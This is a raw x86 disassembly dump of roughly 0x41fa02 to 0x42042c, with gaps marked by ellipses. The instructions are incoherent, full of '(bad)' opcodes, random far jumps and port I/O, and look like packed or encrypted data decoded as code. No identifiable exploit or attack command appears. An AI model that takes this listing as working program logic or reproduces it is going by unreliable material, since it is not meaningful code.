  41fa02:	sub    al,0x37
  41fa04:	loope  0x41fa5f
  41fa06:	and    eax,DWORD PTR [ecx-0x5297b284]
  41fa0c:	out    0x45,al
  41fa0e:	scas   al,BYTE PTR es:[edi]
  41fa0f:	dec    esp
  41fa10:	xor    dl,al
  41fa12:	sub    BYTE PTR [ecx+0x727938eb],al
  41fa18:	or     BYTE PTR [edi],0x92
  41fa1b:	or     al,0xaa
  41fa1d:	cs ja  0x41fa30
  41fa20:	in     eax,dx
  41fa21:	(bad)  
  41fa22:	xchg   ecx,eax
  41fa23:	jg     0x41f9ff
  41fa25:	daa    
  41fa26:	out    dx,al
  41fa27:	cmp    DWORD PTR [ecx-0x1e19db1e],ebp
  41fa2d:	sub    al,0x4e
  41fa2f:	xor    ah,BYTE PTR [edi+0x51]
  41fa32:	jle    0x41fa76
  41fa34:	jge    0x41f9bd
  41fa36:	sub    eax,DWORD PTR [ecx]
  41fa38:	pop    esi
  41fa39:	jp     0x41fa5a
  41fa3b:	aad    0xe6
  41fa3d:	xor    eax,DWORD PTR [ebp+0x78e47243]
  41fa43:	shl    bl,cl
  41fa45:	sub    al,0xe0
  41fa47:	xor    bl,BYTE PTR [esi]
  41fa49:	fstp   st(3)
  41fa4b:	add    BYTE PTR [edx-0x65ddb7f8],dl
  41fa51:	das    
  41fa52:	jmp    0xb89f284e
  41fa57:	xchg   ebx,eax
  41fa58:	ret    
  41fa59:	sub    esp,ebp
  41fa5b:	push   cs
  41fa5c:	sub    eax,0x32cd3265
  41fa61:	xor    eax,0x1894563d
  41fa66:	push   edx
  41fa67:	dec    edi
  41fa68:	imul   ecx,edx,0x7dfa925e
	...
  41fad6:	or     al,BYTE PTR [ecx-0x49]
  41fad9:	mov    eax,ds:0xeb1ef7ff
  41fade:	and    edx,DWORD PTR [edi-0x5d]
  41fae1:	adc    eax,0x98cef7a
  41fae6:	addr16 push esp
  41fae8:	add    DWORD PTR [eax],eax
  41faea:	add    BYTE PTR [ecx],al
  41faec:	add    BYTE PTR [eax],al
  41faee:	(bad)  
  41faf0:	push   ebx
  41faf1:	cmp    BYTE PTR [ecx-0x5e08bebe],cl
  41faf7:	and    DWORD PTR [edi-0x22d86a52],esi
  41fafd:	add    al,0x1b
  41faff:	out    0x6,eax
  41fb01:	mov    al,0xf0
  41fb03:	xchg   esi,eax
  41fb04:	sub    DWORD PTR [ebp+0x6fe0869f],ebp
  41fb0a:	popa   
  41fb0b:	jne    0x41fb7b
  41fb0d:	dec    esi
  41fb0e:	cmp    al,0xf8
  41fb10:	stos   DWORD PTR es:[edi],eax
  41fb11:	sbb    edi,edi
  41fb13:	mov    ds:0x9b5c097e,al
  41fb18:	or     DWORD PTR [edi-0x22dc17fe],ebx
  41fb1e:	cmp    cl,BYTE PTR ds:0x74957b6e
  41fb24:	jmp    0x27b6:0xf2c1f4ba
  41fb2b:	dec    edi
  41fb2c:	sub    DWORD PTR [eax-0x19],eax
  41fb2f:	nop
  41fb30:	push   eax
  41fb31:	and    ch,BYTE PTR [esi]
  41fb33:	or     eax,0xca98c9a3
  41fb38:	or     BYTE PTR [esp+ebx*2],dl
  41fb3b:	cld    
  41fb3c:	mov    edx,0x28929a88
  41fb41:	push   esi
  41fb42:	clc    
  41fb43:	or     DWORD PTR [ecx],ebp
  41fb45:	in     al,dx
  41fb46:	inc    edi
  41fb47:	out    0x83,eax
  41fb49:	enter  0x6f3a,0xd9
  41fb4d:	sbb    edx,edi
  41fb4f:	inc    eax
  41fb50:	xchg   esp,eax
  41fb51:	(bad)  
  41fb52:	scas   eax,DWORD PTR es:[edi]
  41fb53:	fcom   DWORD PTR [esp+eax*1-0x6d]
  41fb57:	add    DWORD PTR [esp+edi*4+0x545292a0],eax
  41fb5e:	dec    eax
  41fb5f:	dec    esi
  41fb60:	mov    bh,0xd6
  41fb62:	jno    0x41fb69
  41fb64:	int3   
  41fb65:	sub    eax,0x421fbedb
  41fb6a:	ds mov esi,ecx
  41fb6d:	pop    es
  41fb6e:	and    DWORD PTR [ebp+0x7b],esi
  41fb71:	imul   eax,DWORD PTR [ecx+0x12552e9a],0x29
  41fb78:	jnp    0x41fb24
  41fb7a:	ss jo  0x41fb2a
  41fb7d:	sahf   
  41fb7e:	inc    ecx
  41fb7f:	sbb    al,0x5b
  41fb81:	and    al,0xea
  41fb83:	mov    ch,0xdc
  41fb85:	mov    ah,0x25
  41fb87:	or     ah,0x10
  41fb8a:	popf   
  41fb8b:	push   cs
  41fb8c:	pop    eax
  41fb8d:	adc    eax,0x7187a158
  41fb92:	div    DWORD PTR [edi-0x13]
  41fb95:	jno    0x41fb77
  41fb97:	test   DWORD PTR [esi],0xc94f1c68
  41fb9d:	sub    DWORD PTR [esp+ecx*2-0x25],ebp
  41fba1:	sbb    eax,0x446d461d
  41fba6:	jbe    0x41fc21
  41fba8:	enter  0xb611,0x3e
  41fbac:	inc    esi
  41fbad:	idiv   esp
  41fbaf:	ja     0x41fc06
  41fbb1:	scas   eax,DWORD PTR es:[edi]
  41fbb2:	mov    esi,esp
  41fbb4:	push   es
  41fbb5:	adc    DWORD PTR [ebp+0x4c],ebp
  41fbb8:	adc    eax,0xe17ddca7
  41fbbd:	cdq    
  41fbbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbbf:	push   edi
  41fbc0:	mov    ebx,0x3236b6fd
  41fbc5:	dec    ebx
  41fbc6:	call   0xe027:0x2e22f6dc
  41fbcd:	push   0xffffff88
  41fbcf:	stos   DWORD PTR es:[edi],eax
  41fbd0:	test   DWORD PTR [esi+0x612fcbac],edi
  41fbd6:	or     edx,DWORD PTR [edi-0x6c]
  41fbd9:	xchg   ebx,eax
  41fbda:	pop    eax
  41fbdb:	lds    edi,FWORD PTR [esi+edi*4-0x4ad94f40]
  41fbe2:	pop    edi
  41fbe3:	pop    ebx
  41fbe4:	loope  0x41fbe1
  41fbe6:	mov    bl,0x39
  41fbe8:	jecxz  0x41fc30
  41fbea:	mov    eax,DWORD PTR [edx+ecx*1-0x36]
	...
  41fc56:	fsubr  QWORD PTR [eax]
  41fc58:	mov    ah,ah
  41fc5a:	(bad)  
  41fc5b:	out    0xfe,al
  41fc5d:	cmp    BYTE PTR [esi],ah
  41fc5f:	ret    
  41fc60:	or     DWORD PTR [esi],edx
  41fc62:	cmp    al,0x3c
  41fc64:	xor    DWORD PTR [edx+0x15567],ebx
  41fc6a:	add    BYTE PTR [ecx],al
  41fc6c:	add    BYTE PTR [eax],al
  41fc6e:	mov    dh,0xca
  41fc70:	jecxz  0x41fc18
  41fc72:	outs   dx,DWORD PTR ds:[esi]
  41fc73:	ret    0xe937
  41fc76:	js     0x41fccf
  41fc78:	stos   BYTE PTR es:[edi],al
  41fc79:	push   0xffffffa5
  41fc7b:	xlat   BYTE PTR ds:[ebx]
  41fc7c:	sub    bl,ah
  41fc7e:	and    al,0xb2
  41fc80:	and    al,0xa5
  41fc82:	mov    al,ds:0x40f29e3d
  41fc87:	test   eax,0xdc3b8ca5
  41fc8c:	imul   edx,DWORD PTR [edi],0x71
  41fc8f:	and    eax,0xca78f621
  41fc94:	xchg   BYTE PTR [edx+0x6e],ch
  41fc97:	sub    cl,BYTE PTR [eax]
  41fc99:	ins    DWORD PTR es:[edi],dx
  41fc9a:	into   
  41fc9b:	sub    ecx,DWORD PTR [edi-0x22205788]
  41fca1:	out    0xe8,al
  41fca3:	cmc    
  41fca4:	sub    al,0x1f
  41fca6:	aam    0x5
  41fca8:	mov    eax,ds:0xf0cadc57
  41fcad:	mov    dh,0xd1
  41fcaf:	sub    al,0x5a
  41fcb1:	adc    edi,DWORD PTR [edx]
  41fcb3:	inc    edx
  41fcb4:	mov    al,0x7a
  41fcb6:	inc    esp
  41fcb7:	xor    DWORD PTR [edi],edx
  41fcb9:	ss lahf 
  41fcbb:	cmp    DWORD PTR [ebp+0x63],eax
  41fcbe:	sbb    BYTE PTR [edi+ecx*2],dh
  41fcc1:	inc    eax
  41fcc2:	test   DWORD PTR [edx],edx
  41fcc4:	add    DWORD PTR [esi],eax
  41fcc6:	data16 adc ch,BYTE PTR [ebx+ecx*8+0x15]
  41fccb:	(bad)  
  41fccc:	jmp    0x13912e91
  41fcd1:	mov    fs,ecx
  41fcd3:	popa   
  41fcd4:	fs inc ebx
  41fcd6:	inc    eax
  41fcd7:	push   edi
  41fcd8:	dec    esp
  41fcd9:	pop    ds
  41fcda:	(bad)  
  41fcdb:	and    eax,0x6a93484d
  41fce0:	mov    ebx,0xc4f26e5b
  41fce5:	xchg   ecx,eax
  41fce6:	test   DWORD PTR [ebx],ebp
  41fce8:	inc    esp
  41fce9:	inc    ecx
  41fcea:	xchg   ebp,eax
  41fceb:	mov    bl,0x60
  41fced:	xor    edx,DWORD PTR [edi-0x3cb43753]
  41fcf3:	push   edi
  41fcf4:	mov    dl,0x23
  41fcf6:	lock jmp 0x584:0xf0b0a761
  41fcfe:	mov    edx,0xf4f768fc
  41fd03:	int    0x81
  41fd05:	rcr    DWORD PTR [esi+0x34],1
  41fd08:	cmp    DWORD PTR [eax+0x59],0xcf1b4348
  41fd0f:	std    
  41fd10:	(bad)  [edx+ebx*1]
  41fd13:	sbb    BYTE PTR [ebp+0x16],dh
  41fd16:	cwde   
  41fd17:	push   0x18
  41fd19:	mov    dl,0x7d
  41fd1b:	dec    eax
  41fd1c:	out    dx,eax
  41fd1d:	xor    esi,ebp
  41fd1f:	mov    eax,0xd8c2a37e
  41fd24:	sub    eax,0xf6e6ea0b
  41fd29:	sti    
  41fd2a:	test   eax,0x125fda23
  41fd2f:	push   ebx
  41fd30:	js     0x41fd6a
  41fd32:	pop    eax
  41fd33:	jno    0x41fcc2
  41fd35:	shl    DWORD PTR [esi-0x64],cl
  41fd38:	inc    ecx
  41fd39:	mov    esi,0x482a05f7
  41fd3e:	lock push esp
  41fd40:	xor    DWORD PTR [ebx-0x333029af],0xffffffcc
  41fd47:	sub    BYTE PTR [eax+0x26d3d4c1],bl
  41fd4d:	and    BYTE PTR [ebp+0x11],ah
  41fd50:	jmp    0xae51:0xeb0bc82
  41fd57:	hlt    
  41fd58:	mov    bh,0xe5
  41fd5a:	ins    DWORD PTR es:[edi],dx
  41fd5b:	ucomiss xmm2,DWORD PTR ds:0x5db038d9
  41fd62:	aaa    
  41fd63:	inc    edi
  41fd64:	sbb    al,BYTE PTR [ebx+0x73]
  41fd67:	ret    0xf134
  41fd6a:	pusha  
  41fd6b:	fmul   st(5),st
  41fd6d:	clc    
	...
  41fdd6:	or     al,0x6a
  41fdd8:	push   edx
  41fdd9:	shl    DWORD PTR [esi-0x7],0x9f
  41fddd:	out    dx,eax
  41fdde:	pop    ds
  41fddf:	pop    edx
  41fde0:	pushf  
  41fde1:	push   ss
  41fde2:	nop
  41fde3:	test   eax,0x56678c38
  41fde8:	add    DWORD PTR [eax],eax
  41fdea:	add    BYTE PTR [ecx],al
  41fdec:	add    BYTE PTR [eax],al
  41fdee:	(bad)  
  41fdef:	pop    ss
  41fdf0:	jo     0x41fdf0
  41fdf2:	lahf   
  41fdf3:	adc    eax,0x4fbe0b9f
  41fdf8:	mov    eax,ds:0xce85d6b7
  41fdfd:	xchg   DWORD PTR [edx+0x7e28c8ba],ecx
  41fe03:	pop    edi
  41fe04:	clc    
  41fe05:	lods   eax,DWORD PTR ds:[esi]
  41fe06:	outs   dx,DWORD PTR ds:[esi]
  41fe07:	fsub   DWORD PTR [ebx]
  41fe09:	xor    DWORD PTR [ebx+ecx*1-0x27c1575c],edx
  41fe10:	das    
  41fe11:	and    DWORD PTR [esi+0xea1e909],edx
  41fe17:	inc    eax
  41fe18:	xor    eax,0x7f94d950
  41fe1d:	or     al,0xbe
  41fe1f:	stos   DWORD PTR es:[edi],eax
  41fe20:	in     eax,0x13
  41fe22:	sub    al,0x21
  41fe24:	jmp    0x5bd5:0xc643a964
  41fe2b:	arpl   bx,bx
  41fe2d:	aam    0x5d
  41fe2f:	mov    DWORD PTR [ebp+eiz*2-0x29545fbf],eax
  41fe36:	or     dh,BYTE PTR [edx]
  41fe38:	in     al,0x3f
  41fe3a:	push   0xcfa74824
  41fe3f:	popf   
  41fe40:	mov    edx,0x82ec8860
  41fe45:	lea    ebp,[ebp-0x71]
  41fe48:	add    eax,0x7c079a8b
  41fe4d:	mov    ah,0x3f
  41fe4f:	pop    ds
  41fe50:	sub    DWORD PTR [edi-0x8],eax
  41fe53:	je     0x41fece
  41fe55:	add    edx,edx
  41fe57:	test   esp,esp
  41fe59:	inc    ebx
  41fe5a:	(bad)  
  41fe5b:	sub    DWORD PTR [ecx*4+0x74c6b04b],esp
  41fe62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe63:	mov    ecx,0x300d748e
  41fe68:	mov    ebx,DWORD PTR [ebx]
  41fe6a:	push   edi
  41fe6b:	xchg   DWORD PTR [eax-0x4f0a21e5],edi
  41fe71:	in     al,dx
  41fe72:	aaa    
  41fe73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe74:	cwde   
  41fe75:	push   0xabdd43cd
  41fe7a:	add    DWORD PTR [edi-0x55],esp
  41fe7d:	(bad)  
  41fe7f:	retf   0xed9f
  41fe82:	dec    esp
  41fe83:	xor    DWORD PTR [ebx],0x66eeda9b
  41fe89:	xor    ah,ch
  41fe8b:	xchg   DWORD PTR [ecx],ebx
  41fe8d:	mov    esi,0x7158a06c
  41fe92:	sub    ch,BYTE PTR [edx-0x1494fdda]
  41fe98:	das    
  41fe99:	mov    eax,ds:0xc3352df4
  41fe9e:	stos   DWORD PTR es:[edi],eax
  41fe9f:	add    eax,0x8ecc1026
  41fea4:	pop    esi
  41fea5:	nop
  41fea6:	inc    ebx
  41fea7:	adc    al,0x92
  41fea9:	cmp    BYTE PTR [ebx-0x4f4b1d7d],al
  41feaf:	scas   eax,DWORD PTR es:[edi]
  41feb0:	retf   0x9e85
  41feb3:	add    dl,BYTE PTR [eax+eax*1-0x23a259bc]
  41feba:	leave  
  41febb:	or     eax,0xb560fa38
  41fec0:	or     BYTE PTR [esi-0x55],0xb1
  41fec4:	add    ah,ah
  41fec6:	gs sub ah,0x7c
  41feca:	lahf   
  41fecb:	cmp    DWORD PTR [ecx-0x76fe0c64],esi
  41fed1:	xchg   edx,edx
  41fed3:	mov    al,ds:0xec01897f
  41fed8:	arpl   WORD PTR [ebx],dx
  41feda:	jo     0x41ff0c
  41fedc:	je     0x41fee1
  41fede:	xchg   BYTE PTR [ebp+0x4a8ad4d9],ch
  41fee4:	dec    DWORD PTR ds:0x32f8d587
  41feea:	hlt    
  41feeb:	mov    eax,ebx
  41feed:	jb     0x41feef
	...
  41ff53:	add    BYTE PTR [eax],al
  41ff55:	add    BYTE PTR [edx-0x1865ab],ch
  41ff5b:	out    dx,eax
  41ff5c:	call   FWORD PTR [ebp-0x5]
  41ff5f:	(bad)  
  41ff60:	hlt    
  41ff61:	mov    ah,0x36
  41ff63:	enter  0x1de6,0x67
  41ff67:	push   edi
  41ff68:	add    DWORD PTR [eax],eax
  41ff6a:	add    BYTE PTR [ecx],al
  41ff6c:	add    BYTE PTR [eax],al
  41ff6e:	ins    BYTE PTR es:[edi],dx
  41ff6f:	scas   eax,DWORD PTR es:[edi]
  41ff70:	cs push edx
  41ff72:	fwait
  41ff73:	mov    bl,0xb2
  41ff75:	jecxz  0x41ffd6
  41ff77:	ret    
  41ff78:	ret    
  41ff79:	iret   
  41ff7a:	lahf   
  41ff7b:	mov    ebx,0x491114c4
  41ff80:	xchg   edx,eax
  41ff81:	mov    eax,0xf13abd78
  41ff86:	xchg   ah,bl
  41ff88:	mov    esp,0xcd6bea4f
  41ff8d:	push   edx
  41ff8e:	dec    ecx
  41ff8f:	lods   eax,DWORD PTR ds:[esi]
  41ff90:	inc    esi
  41ff91:	pop    eax
  41ff92:	pop    ds
  41ff93:	add    esi,DWORD PTR [ebx]
  41ff95:	inc    esp
  41ff96:	inc    esi
  41ff97:	ficomp WORD PTR [ecx-0x75]
  41ff9a:	inc    esp
  41ff9b:	push   ds
  41ff9c:	rcr    DWORD PTR [esi],cl
  41ff9e:	and    bl,BYTE PTR [edi-0x71784f38]
  41ffa4:	add    ecx,DWORD PTR [esi]
  41ffa6:	add    bh,BYTE PTR [ecx]
  41ffa8:	iret   
  41ffa9:	call   0xba751697
  41ffae:	sub    DWORD PTR [esi+ebx*1],ecx
  41ffb1:	push   0x31
  41ffb3:	inc    ebp
  41ffb4:	adc    ch,BYTE PTR [ebp+0x50]
  41ffb7:	fist   WORD PTR [ecx]
  41ffb9:	xor    BYTE PTR [edi-0x2bf1887f],ah
  41ffbf:	and    BYTE PTR [eax],bl
  41ffc1:	mov    al,0x92
  41ffc3:	push   0x54
  41ffc5:	loopne 0x41ff88
  41ffc7:	xor    esi,ecx
  41ffc9:	out    dx,al
  41ffca:	sbb    esi,ebx
  41ffcc:	int3   
  41ffcd:	mov    esi,0x9c5ec868
  41ffd2:	iret   
  41ffd3:	out    0x27,al
  41ffd5:	stos   DWORD PTR es:[edi],eax
  41ffd6:	xchg   edx,eax
  41ffd7:	jmp    0x2efb14a1
  41ffdc:	jno    0x41ffe1
  41ffde:	ficom  WORD PTR [edi]
  41ffe0:	jae    0x41ffeb
  41ffe2:	mov    ah,0xe9
  41ffe4:	push   esi
  41ffe5:	ret    
  41ffe6:	jge    0x41ff92
  41ffe8:	iret   
  41ffe9:	das    
  41ffea:	push   ebx
  41ffeb:	ins    BYTE PTR es:[edi],dx
  41ffec:	add    eax,0xe49c27e1
  41fff1:	cdq    
  41fff2:	nop
  41fff3:	aam    0x44
  41fff5:	div    ah
  41fff7:	fimul  WORD PTR [edi+edx*1-0x129a7cc8]
  41fffe:	inc    ebp
  420000:	inc    esp
  420001:	xor    ch,cl
  420003:	push   ebx
  420004:	xor    ecx,esp
  420006:	or     dh,BYTE PTR [esi-0xf]
  420009:	rcl    DWORD PTR [edi-0x64],1
  42000c:	jne    0x41ffb3
  42000e:	clc    
  42000f:	(bad)  
  420010:	mov    edx,0xff890557
  420015:	hlt    
  420016:	jg     0x420067
  420018:	int3   
  420019:	scas   eax,DWORD PTR es:[edi]
  42001a:	adc    BYTE PTR [edi],bl
  42001c:	pop    ebx
  42001d:	and    BYTE PTR [ebp-0x2a0c5909],dl
  420023:	ret    
  420024:	sbb    BYTE PTR [edi+0x1564bc08],0xab
  42002b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42002c:	pop    ds
  42002d:	jb     0x42006a
  42002f:	ror    bh,cl
  420031:	dec    edx
  420032:	pop    ecx
  420033:	icebp  
  420034:	pop    ss
  420035:	jns    0x41ffec
  420037:	les    esi,FWORD PTR [ebp-0x6b]
  42003a:	clc    
  42003b:	lods   eax,DWORD PTR ds:[esi]
  42003c:	xor    ebp,DWORD PTR [edx-0x32825c58]
  420042:	sahf   
  420043:	and    ah,BYTE PTR [edi+0x79c98e98]
  420049:	test   DWORD PTR [esi+0x33],eax
  42004c:	xchg   ecx,eax
  42004d:	push   eax
  42004e:	jg     0x41ffde
  420050:	and    BYTE PTR [edi],cl
  420052:	sbb    BYTE PTR [edx-0x6e562951],dh
  420058:	in     al,0xdd
  42005a:	stos   DWORD PTR es:[edi],eax
  42005b:	ins    DWORD PTR es:[edi],dx
  42005c:	addr16 mov cl,0xcd
  42005f:	or     DWORD PTR [ebp-0x77b3fd41],ecx
  420065:	les    eax,FWORD PTR [edx]
  420067:	ins    DWORD PTR es:[edi],dx
  420068:	ja     0x42005e
  42006a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42006b:	je     0x4200a3
  42006d:	pop    ss
	...
  4200d6:	bound  esp,QWORD PTR [ebp-0x8808a]
  4200dc:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xffffff9b
  4200e3:	mov    ss,WORD PTR [edi+0x158672f]
  4200e9:	add    BYTE PTR [eax],al
  4200eb:	add    DWORD PTR [eax],eax
  4200ed:	add    BYTE PTR [edx+0x17],ch
  4200f0:	in     eax,dx
  4200f1:	dec    ebx
  4200f2:	mov    ch,0xce
  4200f4:	dec    esp
  4200f5:	pop    ebp
  4200f6:	add    BYTE PTR [edx-0x47],cl
  4200f9:	in     al,dx
  4200fa:	push   es
  4200fb:	lods   al,BYTE PTR ds:[esi]
  4200fc:	mov    ecx,0xbe81a38b
  420101:	psubw  mm7,QWORD PTR [edx+0x6a28297]
  420108:	xor    ebx,DWORD PTR [edi-0x12]
  42010b:	jp     0x42017b
  42010d:	sbb    ch,BYTE PTR [edi+0x3fb7191d]
  420113:	out    0x20,al
  420115:	adc    ebp,DWORD PTR [ecx+ebp*4-0x47]
  420119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42011a:	dec    ebp
  42011b:	and    DWORD PTR [ecx+ebx*4+0x3b],ecx
  42011f:	mov    BYTE PTR [edx-0x7b],bl
  420122:	jmp    0x3fd4a040
  420127:	mov    eax,ds:0xa54b2b11
  42012c:	fbstp  TBYTE PTR [ebp-0x35]
  42012f:	ins    BYTE PTR es:[edi],dx
  420130:	mov    ebx,0xcd8d1507
  420135:	retf   0x961e
  420138:	daa    
  420139:	dec    esi
  42013a:	jbe    0x4201ac
  42013c:	dec    ebp
  42013d:	pop    esi
  42013e:	jnp    0x4200c4
  420140:	mov    ecx,DWORD PTR [ecx-0x5f]
  420143:	sbb    ax,ax
  420146:	cmc    
  420147:	das    
  420148:	jne    0x42014d
  42014a:	jmp    0xd155:0xe643e4bd
  420151:	bound  eax,QWORD PTR [edi]
  420153:	mov    esp,0x53cf597b
  420158:	int    0xb5
  42015a:	fcomip st,st(3)
  42015c:	xor    al,0x4e
  42015e:	bswap  edx
  420160:	pusha  
  420161:	test   al,0x40
  420164:	dec    ebx
  420165:	aad    0xf0
  420167:	outs   dx,BYTE PTR ds:[esi]
  420168:	aam    0x3e
  42016a:	jb     0x4201b8
  42016c:	fiadd  DWORD PTR [ebx+esi*4-0x2e]
  420170:	std    
  420171:	inc    edi
  420172:	popf   
  420173:	pop    edi
  420174:	xchg   ebp,eax
  420175:	xchg   ebp,eax
  420176:	mov    bl,0x67
  420178:	or     dl,cl
  42017a:	jae    0x4201f8
  42017c:	clc    
  42017d:	pop    es
  42017e:	leave  
  42017f:	clc    
  420180:	sbb    eax,0x33884902
  420185:	ficom  DWORD PTR [edi+0x62c6e5b9]
  42018b:	sbb    DWORD PTR [esi*8-0x3553a03f],edi
  420192:	data16 jp 0x420201
  420195:	fsubr  QWORD PTR [edi+esi*2-0x4abf96ff]
  42019c:	test   dl,ah
  42019e:	out    dx,al
  42019f:	pusha  
  4201a0:	test   BYTE PTR [eax+0x1c87d1cc],al
  4201a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201a7:	cmc    
  4201a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201a9:	or     ch,BYTE PTR [ebx-0x1e276753]
  4201af:	test   BYTE PTR [edx-0x1c5dfdad],ch
  4201b5:	fcomp  QWORD PTR [ebx+0x72]
  4201b8:	inc    ebx
  4201b9:	pop    edx
  4201ba:	xor    esp,ecx
  4201bc:	sub    esi,DWORD PTR ds:0x6df0a662
  4201c2:	imul   esp,eax,0x5bcf2100
  4201c8:	mov    ebx,0xce5f06fa
  4201cd:	test   eax,0x11a99ad9
  4201d2:	xlat   BYTE PTR ds:[ebx]
  4201d3:	dec    eax
  4201d4:	pushf  
  4201d5:	and    ch,ah
  4201d7:	repz cmp DWORD PTR [edx-0x14],esi
  4201db:	leave  
  4201dc:	push   edi
  4201dd:	fisubr WORD PTR [edi]
  4201df:	call   0xfb4e:0xbafad64e
  4201e6:	jl     0x4201ee
  4201e8:	adc    eax,0x612299c9
  4201ed:	add    BYTE PTR gs:[eax],al
	...
  420254:	add    BYTE PTR [eax],al
  420256:	jae    0x420227
  420258:	fwait
  420259:	cmp    DWORD PTR [edi-0x27300c83],edi
  42025f:	stos   BYTE PTR es:[edi],al
  420260:	sar    BYTE PTR [ebx+0x2f5f805b],1
  420266:	addr16 pop ecx
  420268:	add    DWORD PTR [eax],eax
  42026a:	add    BYTE PTR [ecx],al
  42026c:	add    BYTE PTR [eax],al
  42026e:	idiv   bl
  420270:	(bad)  
  420271:	sub    edx,DWORD PTR [esi-0x5d107d7f]
  420277:	out    0x2c,al
  420279:	cmc    
  42027a:	inc    esi
  42027b:	mov    al,ds:0x5c98c778
  420280:	xor    ch,BYTE PTR [eax-0x7e]
  420283:	rcl    BYTE PTR [ebp-0x60],cl
  420286:	leave  
  420287:	and    al,0x74
  420289:	addr16 or ebp,edi
  42028c:	inc    edi
  42028d:	enter  0x8b5d,0xb3
  420291:	jb     0x420283
  420293:	dec    esp
  420294:	sbb    ah,ch
  420296:	xchg   edi,eax
  420297:	(bad)  
  420298:	dec    edi
  420299:	adc    bl,BYTE PTR [ecx-0x421a5b21]
  42029f:	push   ebx
  4202a0:	adc    BYTE PTR [edx],ah
  4202a2:	popf   
  4202a3:	cmp    al,0xe3
  4202a5:	pushf  
  4202a6:	cdq    
  4202a7:	inc    edi
  4202a8:	aas    
  4202a9:	faddp  st(7),st
  4202ab:	mul    DWORD PTR [edi]
  4202ad:	les    esp,FWORD PTR [ecx]
  4202af:	mov    BYTE PTR [ebx+0x37],bl
  4202b2:	inc    esi
  4202b3:	or     BYTE PTR [edi-0x5],cl
  4202b6:	jge    0x420247
  4202b8:	adc    BYTE PTR [esi+edi*2],dh
  4202bb:	dec    edi
  4202bc:	xchg   DWORD PTR [ebx-0x22],esi
  4202bf:	out    0xcb,eax
  4202c1:	xchg   DWORD PTR [esi],ecx
  4202c3:	pop    ss
  4202c4:	(bad)
  4202c7:	cmp    bh,0xea
  4202ca:	mov    ecx,0x4530ee65
  4202cf:	inc    ecx
  4202d0:	retf   0x8bf5
  4202d3:	xchg   edx,eax
  4202d4:	pop    eax
  4202d5:	jle    0x420306
  4202d7:	mov    esp,0x5498c605
  4202dc:	push   es
  4202dd:	sub    eax,0x8ac8b3f2
  4202e2:	mov    ebx,0xc8a62e93
  4202e7:	pop    ebp
  4202e8:	dec    ebp
  4202e9:	xor    BYTE PTR ds:0x296b2b11,al
  4202ef:	lahf   
  4202f0:	cmp    al,0x5a
  4202f2:	shl    DWORD PTR [ebp-0x22fc1aa7],0x19
  4202f9:	cmp    edi,DWORD PTR [eax]
  4202fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202fc:	rcr    DWORD PTR [edi-0x5ae796e6],cl
  420302:	push   ss
  420303:	sub    bl,BYTE PTR [esi+0x4d6efe33]
  420309:	pop    edi
  42030a:	sub    DWORD PTR ds:0xfe4055dc,edx
  420310:	xchg   esi,eax
  420311:	mov    al,0xfb
  420313:	out    dx,eax
  420314:	scas   al,BYTE PTR es:[edi]
  420315:	mov    esi,0x35ef203b
  42031a:	cli    
  42031b:	pushf  
  42031c:	jg     0x420391
  42031e:	jl     0x4202ed
  420320:	jecxz  0x420347
  420322:	aaa    
  420323:	sub    al,0xde
  420325:	lock shl DWORD PTR [ecx+ebp*4-0x48e67b14],1
  42032d:	pop    ecx
  42032e:	and    al,0x44
  420330:	cmp    BYTE PTR [ecx+0x21],ch
  420333:	ins    DWORD PTR es:[edi],dx
  420334:	inc    edx
  420335:	fcmovnb st,st(2)
  420337:	addr16 icebp 
  420339:	je     0x4203a6
  42033b:	retf   
  42033c:	jae    0x4202ed
  42033e:	outs   dx,DWORD PTR ds:[esi]
  42033f:	pop    esi
  420340:	push   0xffffffa0
  420342:	sub    eax,0xfa75ecc5
  420347:	xchg   ecx,eax
  420348:	push   cs
  420349:	outs   dx,DWORD PTR ds:[esi]
  42034a:	repz lock mov cl,ch
  42034e:	dec    eax
  42034f:	xor    ah,al
  420351:	pop    ds
  420352:	aad    0x7a
  420354:	dec    ebx
  420355:	nop
  420356:	mov    ds:0x3c7f1230,eax
  42035b:	cli    
  42035c:	add    eax,0x9b6c87c1
  420361:	loope  0x420305
  420363:	jno    0x4202f5
  420365:	mov    al,0x43
  420367:	add    esi,esi
  420369:	scas   eax,DWORD PTR es:[edi]
  42036a:	cdq    
  42036b:	mov    ah,0xc7
  42036d:	and    al,0x0
	...
  4203d3:	add    BYTE PTR [eax],al
  4203d5:	add    BYTE PTR [ecx+0x6],al
  4203d8:	clc    
  4203d9:	mov    esi,0xff47feff
  4203de:	and    BYTE PTR [eax+0x2a],bh
  4203e1:	hlt    
  4203e2:	jle    0x420394
  4203e4:	adc    BYTE PTR [eax+0x67],ch
  4203e7:	pop    edx
  4203e8:	add    DWORD PTR [eax],eax
  4203ea:	add    BYTE PTR [ecx],al
  4203ec:	add    BYTE PTR [eax],al
  4203ee:	xchg   ebx,eax
  4203ef:	(bad)  
  4203f0:	jae    0x420425
  4203f2:	add    bh,BYTE PTR [edx+eax*1+0x5f33e3c3]
  4203f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203fa:	retf   
  4203fb:	scas   al,BYTE PTR es:[edi]
  4203fc:	mov    eax,DWORD PTR [esi+edx*4+0x752039c2]
  420403:	mov    eax,ds:0xba1e4ba3
  420408:	(bad)  
  420409:	fist   DWORD PTR [eax+0x2d0ca450]
  42040f:	jno    0x420403
  420411:	lods   eax,DWORD PTR ds:[esi]
  420412:	push   ebp
  420413:	out    dx,al
  420414:	xchg   ecx,eax
  420415:	pop    ebp
  420416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420417:	(bad)  
  42041a:	or     eax,0xabaedb2a
  42041f:	fistp  DWORD PTR [eax]
  420421:	int    0xe5
  420423:	dec    ecx
  420424:	pop    edi
  420426:	bound  edi,QWORD PTR [ebp+0x21566206]
  42042c:	mov    dl,0xa9
